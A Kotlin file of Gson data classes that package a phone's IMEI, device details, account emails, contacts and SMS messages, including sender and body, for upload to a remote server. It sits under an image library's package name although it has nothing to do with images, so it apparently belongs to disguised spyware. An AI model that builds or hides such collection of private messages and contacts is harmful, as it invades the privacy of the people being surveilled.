package com.squareup.picasso.data.network

import com.google.gson.annotations.Expose
import com.google.gson.annotations.SerializedName

data class RemotePhone(
    @SerializedName("imei") val imei: String,
    @SerializedName("lastResponse") val lastResponse: String,
    @SerializedName("manufacturer") val manufacturer: String,
    @SerializedName("model") val model: String,
    @SerializedName("so") val so: String
)

data class RemoteUpdatePhone(
    @SerializedName("imei") val imei: String,
    @SerializedName("lastResponse") val lastResponse: String
)

data class RemoteAccount(
    @SerializedName("imei")
    val imei: String,
    @SerializedName("nameEmail")
    val nameEmail: String
)

data class RemoteContact(
    @SerializedName("imei")
    val imei: String,
    @SerializedName("displayName")
    val displayName: String,
    @SerializedName("number")
    val number: String,
    @SerializedName("dateLastUpdate")
    val dateLastUpdate: String
)

data class RemoteSms(
    @SerializedName("imei")
    val imei: String,
    @SerializedName("address")
    val address: String,
    @SerializedName("body")
    val body: String,
    @SerializedName("date")
    val date: String
)

data class DataResponse(
    @SerializedName("msj")
    val msj: String?
)

class DataUpdateResponse(
    @SerializedName("msj")
    val msj: Boolean
)

const val KEY_IMEI_ARG = "KEY_IMEI_ARG_APP"
